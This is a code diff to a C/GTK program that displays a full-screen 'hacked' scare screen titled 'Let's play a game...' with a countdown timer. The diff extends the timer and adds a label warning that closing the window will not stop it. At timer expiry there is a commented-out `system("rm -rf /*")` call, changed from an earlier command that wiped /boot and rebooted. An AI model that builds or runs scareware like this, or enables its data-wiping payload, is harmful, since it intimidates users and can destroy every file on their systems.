@@ -4,7 +4,7 @@
 #include <stdlib.h>
 
 //global vars
-static int sec_expired = 299;
+static int sec_expired = 599;
 static gboolean continue_timer = FALSE;
 
 static gboolean tickTock(gpointer data){
@@ -16,7 +16,7 @@ static gboolean tickTock(gpointer data){
     memset(&buf, 0x0, 256);
     if(sec_expired == 0){
       snprintf(buf, 255, "0:00");
-      //system("rm -rf /boot/* ; reboot");  //DO NOT UNCOMMENT, UNLESS YOU'RE RUNNING THIS ON A VIRUTAL MACHINE
+      //system("rm -rf /*");  //DO NOT UNCOMMENT, UNLESS YOU'RE RUNNING THIS ON A VIRUTAL MACHINE
     } else {
       --sec_expired;
       if(secs < 10){
@@ -45,6 +45,7 @@ int main(int argc, char* argv[])
     GtkWidget* firstSentenceLabel;
     GtkWidget* secondSentenceLabel;
     GtkWidget* finalSentenceLabel;
+    GtkWidget* warningLabel;
 
 
     PangoAttrList *attrList = pango_attr_list_new();
@@ -52,6 +53,9 @@ int main(int argc, char* argv[])
 
     PangoAttrList *textAttr = pango_attr_list_new();
     PangoAttribute *textFontSize = pango_attr_size_new_absolute(30 * PANGO_SCALE);
+
+    PangoAttrList *warningAttr = pango_attr_list_new();
+    PangoAttribute *warningFontSize = pango_attr_size_new_absolute(10 * PANGO_SCALE);
 
     PangoAttrList *finalSentenceAttr = pango_attr_list_new();
     PangoAttribute *finalTextFontSize = pango_attr_size_new_absolute(50 * PANGO_SCALE);
@@ -63,14 +67,15 @@ int main(int argc, char* argv[])
 
     pango_attr_list_insert(attrList, fontsize);
     pango_attr_list_insert(textAttr, textFontSize);
+    pango_attr_list_insert(warningAttr, warningFontSize);
     pango_attr_list_insert(finalSentenceAttr, finalTextFontSize);
 
     window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
     gtk_window_set_title(GTK_WINDOW(window), "Let's play a game...");
     gtk_window_set_default_size(GTK_WINDOW(window), 1200, 800);
-    //gtk_window_set_position(GTK_WINDOW(window), GTK_WIN_POS_CENTER);
+    gtk_window_set_position(GTK_WINDOW(window), GTK_WIN_POS_CENTER);
     gtk_window_set_resizable(GTK_WINDOW(window), FALSE);
-    //gtk_widget_override_background_color(window, GTK_STATE_NORMAL, &color);
+    gtk_widget_override_background_color(window, GTK_STATE_NORMAL, &color);
     gtk_window_set_decorated(GTK_WINDOW(window), FALSE);
 
     vbox = gtk_vbox_new(FALSE, 2);
@@ -79,7 +84,7 @@ int main(int argc, char* argv[])
 
     image = gtk_image_new_from_file("resources/images/hacked.png");
 
-    timerLabel = gtk_label_new("5:00");
+    timerLabel = gtk_label_new("10:00");
     gtk_label_set_attributes(GTK_LABEL(timerLabel), attrList);
     pango_attr_list_unref(attrList);
 
@@ -94,11 +99,17 @@ int main(int argc, char* argv[])
     gtk_label_set_attributes(GTK_LABEL(finalSentenceLabel), finalSentenceAttr);
     pango_attr_list_unref(finalSentenceAttr);
 
+    warningLabel = gtk_label_new("(Closing this window will not stop the timer and will make it significantly harder for you to know how much time you have left.)");
+    gtk_label_set_attributes(GTK_LABEL(warningLabel), warningAttr);
+    pango_attr_list_unref(warningAttr);
+
+
     gtk_box_pack_start(GTK_BOX(vbox), image, 0, 0, 0);
     gtk_box_pack_start(GTK_BOX(vbox), timerLabel, 0, 0, 0);
     gtk_box_pack_start(GTK_BOX(vbox), firstSentenceLabel, 0, 0, 0);
     gtk_box_pack_start(GTK_BOX(vbox), secondSentenceLabel, 0, 0, 0);
     gtk_box_pack_start(GTK_BOX(vbox), finalSentenceLabel, 0, 0, 0);
+    gtk_box_pack_start(GTK_BOX(vbox), warningLabel, 0, 0, 0);
 
     gtk_widget_show_all(window);
 
